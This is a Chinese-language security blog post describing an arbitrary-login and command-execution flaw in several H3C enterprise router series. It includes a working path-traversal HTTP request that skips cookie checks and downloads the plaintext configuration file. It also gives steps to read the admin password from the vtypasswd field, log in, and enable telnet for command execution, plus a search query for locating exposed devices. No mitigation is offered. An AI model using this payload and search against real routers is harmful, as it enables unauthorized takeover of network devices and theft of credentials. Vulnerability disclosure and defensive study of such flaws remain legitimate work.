#  H3C多系列路由器存在任意用户登录漏洞   
原创 骇客安全  骇客安全   2025-03-15 17:11  
  
# 一、漏洞简介  
  
 H3C 企业路由器(ERN ERG2N GR 系列》存在任意用户登录和命令 执行漏洞，攻击者可通过访问nserLog in.asp/actionpalicy_status1./xxxx.cfg 接口，xxxx为设备型号（比如设备型号为 ER5200G2 ，即访问userLog in.asp/../actionpolicy_status/../ER5200G2.cfg），统过COOKIE 验证，进行目录穿越，获取 设备的明文配置文件，配置中有明文的web 管理员账号admin 的密码，登陆后台 即可通过开启 telenet 获取命令执行权限    
# 二、影响版本  
- H3C多系列路由器  
# 三、资产测绘  
- hunterapp.name="H3C Router Management"  
- 登录页面  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991N3yBaRTQjPXfQHWV5NwfVS2youBFHj3S3h89CL6sJq5UbM7y8s679mSvEIMicjEILibQnl7icg1KiabQ/640?wx_fmt=png&from=appmsg "null")  
# 四、漏洞复现  
1. 访问userLog in.asp/actionpalicy_status1./xxxx.cfg 接口，xxxx为设备型号（比如设备型号为 ER5200G2 ，即访问userLog in.asp/../actionpolicy_status/../ER5200G2.cfg）  
1. 根据设备型号修改payload  
```
GET /userLogin.asp/../actionpolicy_status/../ER2200G2.cfg HTTP/1.1
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991N3yBaRTQjPXfQHWV5NwfVS6WXqmicm5tgjUePwAuXxKzcDoNF6lGMDwPHzO4Bgy7BA653Zs5GtVVA/640?wx_fmt=png&from=appmsg "null")  
1. 密码就在<font style="color:rgba(0, 0, 0, 0.9);">vtypasswd</font>  
字段  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991N3yBaRTQjPXfQHWV5NwfVS78UPr8PVoGO2Q477oHmFQzib9WNnzqOFiazgbsSPJHEy8icPgGv4LicOXA/640?wx_fmt=png&from=appmsg "null")  
1. 账户为admin  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991N3yBaRTQjPXfQHWV5NwfVSUDLgtoawo0fTt1tZBYUMsicickZq8fdIlPzUFTld4utKbmk6BrPTRgKw/640?wx_fmt=png&from=appmsg "null")  
1. 可在远程管理  
->远程telnet管理  
处开启telnet获取命令执行权限  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991N3yBaRTQjPXfQHWV5NwfVS0CbEvibT7NEdYQpIVgGBudaxpJGibTibicgZOvFhMDTUhUAaC7u3MLR5QA/640?wx_fmt=png&from=appmsg "null")  
  
  
  
